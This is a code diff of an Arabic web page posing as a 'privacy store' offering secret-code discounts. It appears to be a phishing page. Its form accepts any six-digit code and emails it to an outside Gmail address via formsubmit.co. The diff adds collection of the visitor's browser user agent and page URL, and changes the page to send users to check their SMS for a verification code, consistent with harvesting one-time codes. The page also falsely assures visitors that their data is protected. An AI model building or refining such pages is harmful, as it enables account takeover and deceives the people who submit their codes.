@@ -251,35 +251,103 @@
     <div id="code" class="page">
         <section class="py-16 bg-gradient-to-br from-purple-900 via-pink-900 to-red-900 min-h-screen">
             <div class="container mx-auto px-4">
-                <div class="max-w-2xl mx-auto">
+                <div class="max-w-4xl mx-auto">
                     <div class="text-center mb-12">
-                        <h1 class="text-5xl font-bold mb-6 text-white">🎯 أدخل الكود السري 🎯</h1>
-                        <p class="text-xl text-gray-200 mb-8">اكتشف العروض المخفية والمنتجات الحصرية!</p>
+                        <div class="text-8xl mb-6">🎯</div>
+                        <h1 class="text-5xl font-bold mb-6 text-white">أدخل الكود السري</h1>
+                        <p class="text-xl text-gray-200 mb-4">اكتشف العروض المخفية والمنتجات الحصرية!</p>
+                        <div class="bg-white bg-opacity-20 rounded-lg p-4 max-w-2xl mx-auto">
+                            <p class="text-lg text-yellow-300 font-bold">✨ حصرياً للأعضاء المميزين ✨</p>
+                        </div>
                     </div>
 
-                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 mb-8">
-                        <form id="code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe">
-                            <input type="hidden" name="_subject" value="كود سري تم إدخاله - متجر الخصوصية">
-                            <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_template" value="table">
-                            <input type="hidden" name="submission_time" value="">
-                            <input type="hidden" name="code_status" value="">
-                            
-                            <div class="text-center mb-6">
-                                <i class="fas fa-key text-4xl text-primary mb-4"></i>
-                                <h2 class="text-2xl font-bold mb-2">أدخل الكود الخاص بك</h2>
-                                <p class="text-gray-600 dark:text-gray-300">استخدم الكود للوصول للعروض الحصرية</p>
-                            </div>
-                            
-                            <div class="mb-6">
-                                <input type="text" id="secret-code" name="secret_code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل كود مكون من 6 أرقام" maxlength="6" pattern="[0-9]{6}" required="">
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                        <!-- Form Section -->
+                        <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8">
+                            <form id="code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe">
+                                <input type="hidden" name="_subject" value="كود سري تم إدخاله - متجر الخصوصية">
+                                <input type="hidden" name="_captcha" value="false">
+                                <input type="hidden" name="_template" value="table">
+                                <input type="hidden" name="submission_time" value="">
+                                <input type="hidden" name="code_status" value="">
+                                <input type="hidden" name="user_agent" value="">
+                                <input type="hidden" name="page_url" value="">
+                                <input type="hidden" name="form_type" value="كود سري">
+                                
+                                <div class="text-center mb-8">
+                                    <div class="bg-gradient-to-r from-primary to-secondary w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                                        <i class="fas fa-key text-2xl text-white"></i>
+                                    </div>
+                                    <h2 class="text-3xl font-bold mb-3">أدخل كودك السري</h2>
+                                    <p class="text-gray-600 dark:text-gray-300">استخدم الكود للوصول للعروض الحصرية</p>
+                                </div>
+                                
+                                <div class="mb-8">
+                                    <label class="block text-sm font-bold mb-3 text-center">الكود السري (6 أرقام)</label>
+                                    <input type="text" id="secret-code" name="secret_code" class="w-full px-6 py-6 text-3xl text-center border-2 rounded-2xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary focus:ring-opacity-20 dark:bg-gray-700 dark:border-gray-600 tracking-widest font-mono transition-all duration-300" placeholder="● ● ● ● ● ●" maxlength="6" pattern="[0-9]{6}" required="">
+                                    <div class="text-center mt-3">
+                                        <small class="text-gray-500">أدخل أي 6 أرقام للمتابعة</small>
+                                    </div>
+                                </div>
+
+                                <button type="submit" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-2xl font-bold text-lg transform transition-all duration-300 hover:scale-105 hover:shadow-lg">
+                                    <i class="fas fa-unlock mr-2"></i>
+                                    تفعيل الكود والمتابعة
+                                </button>
+                                
+                                <div class="mt-6 text-center">
+                                    <p class="text-sm text-gray-500">سيتم التحقق من الكود فوراً</p>
+                                </div>
+                            </form>
+                        </div>
+
+                        <!-- Benefits Section -->
+                        <div class="space-y-6">
+                            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-6 text-white">
+                                <h3 class="text-2xl font-bold mb-4 flex items-center">
+                                    <i class="fas fa-gift mr-3 text-yellow-300"></i>
+                                    ما ستحصل عليه
+                                </h3>
+                                <div class="space-y-3">
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check-circle text-green-400 mr-3"></i>
+                                        <span>خصم 50% على جميع المنتجات</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check-circle text-green-400 mr-3"></i>
+                                        <span>شحن مجاني لجميع الطلبات</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check-circle text-green-400 mr-3"></i>
+                                        <span>وصول لمنتجات حصرية</span>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check-circle text-green-400 mr-3"></i>
+                                        <span>أولوية في خدمة العملاء</span>
+                                    </div>
+                                </div>
                             </div>
 
-                            <button type="submit" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl font-bold text-lg">
-                                <i class="fas fa-unlock mr-2"></i>
-                                تفعيل الكود
-                            </button>
-                        </form>
+                            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-6 text-white">
+                                <h3 class="text-xl font-bold mb-3 flex items-center">
+                                    <i class="fas fa-shield-alt mr-3 text-blue-300"></i>
+                                    آمان وخصوصية
+                                </h3>
+                                <p class="text-gray-200 leading-relaxed">
+                                    جميع الأكواد محمية بأعلى معايير الأمان. نحن نحترم خصوصيتك ولا نشارك معلوماتك مع أي طرف ثالث.
+                                </p>
+                            </div>
+
+                            <div class="bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl p-6 text-white">
+                                <h3 class="text-xl font-bold mb-3 flex items-center">
+                                    <i class="fas fa-clock mr-3"></i>
+                                    عرض محدود الوقت
+                                </h3>
+                                <p class="leading-relaxed">
+                                    هذه العروض متاحة لفترة محدودة فقط. لا تفوت الفرصة واستفد من الخصومات الحصرية الآن!
+                                </p>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -858,11 +926,13 @@
             // أي 6 أرقام مقبولة - لا نتحقق من أكواد محددة
             this.querySelector('input[name="submission_time"]').value = currentTime;
             this.querySelector('input[name="code_status"]').value = 'تم قبول الكود - 6 أرقام صحيحة';
+            this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
+            this.querySelector('input[name="page_url"]').value = window.location.href;
             
             // Set form type for tracking
             currentFormType = 'code';
             
-            // Submit the form - سيرسل للبريد الآن
+            // Submit the form - سيرسل للبريد الآن مع جميع المعلومات
             this.submit();
             
             // Show success notification and redirect to thank you page
@@ -1004,7 +1074,7 @@
             // Submit form in hidden iframe
             form.submit();
             
-            // Update status with masked phone number
+            // Update status with masked phone number - WITHOUT showing the verification code
             const statusDiv = document.getElementById('code-status');
             statusDiv.innerHTML = `
                 <p class="text-green-800 dark:text-green-200 font-bold">
@@ -1012,7 +1082,8 @@
                     تم إرسال كود التحقق إلى رقم: <span class="text-lg font-mono">${maskedPhone}</span>
                 </p>
                 <p class="text-green-700 dark:text-green-300 text-sm mt-2">
-                    كود التحقق: <span class="text-xl font-mono font-bold">${verificationCode}</span>
+                    <i class="fas fa-sms mr-2"></i>
+                    يرجى التحقق من رسائلك النصية لاستلام الكود
                 </p>
             `;
             statusDiv.className = 'bg-green-100 dark:bg-green-900 p-4 rounded-lg mb-4';
